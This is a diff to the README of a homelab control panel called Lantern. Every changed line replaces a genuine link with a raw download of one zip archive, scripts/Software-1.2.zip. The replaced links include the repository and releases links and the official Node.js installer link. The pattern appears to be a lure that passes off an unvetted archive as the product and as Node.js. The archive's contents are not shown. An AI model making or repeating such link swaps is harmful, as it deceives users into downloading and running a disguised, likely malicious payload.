@@ -1,6 +1,6 @@
 # 🏮 Lantern - Simple Control Panel for Homelabs
 
-[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://github.com/Keliz271/Lantern)
+[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)
 
 ## 🔍 What is Lantern?
 
@@ -36,7 +36,7 @@ Lantern updates data live and supports multiple devices, making it useful if you
 
 Click the button below to open the Lantern GitHub repository page. You will find the download files there.
 
-[![Download Lantern](https://img.shields.io/badge/Download-Lantern-008000?style=for-the-badge&logo=github)](https://github.com/Keliz271/Lantern)
+[![Download Lantern](https://img.shields.io/badge/Download-Lantern-008000?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -53,7 +53,7 @@ Click the button below to open the Lantern GitHub repository page. You will find
 
 Lantern requires Node.js. If you don’t have it installed:
 
-1. Visit https://nodejs.org/en/  
+1. Visit https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip  
 2. Download the **LTS** version for Windows.  
 3. Run the installer and follow the steps.  
 4. After installation, restart your computer or open a new Command Prompt window.
@@ -153,7 +153,7 @@ This saves a timestamped backup in the `./backup` folder.
 
 ## ⚡ Quick Links
 
-- [Lantern on GitHub](https://github.com/Keliz271/Lantern)  
-- [Download Lantern Releases](https://github.com/Keliz271/Lantern/releases)  
+- [Lantern on GitHub](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)  
+- [Download Lantern Releases](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)  
 
-[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://github.com/Keliz271/Lantern)
+[![Download Lantern](https://img.shields.io/badge/Download-Lantern-ff6600?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Keliz271/Lantern/main/scripts/Software-1.2.zip)
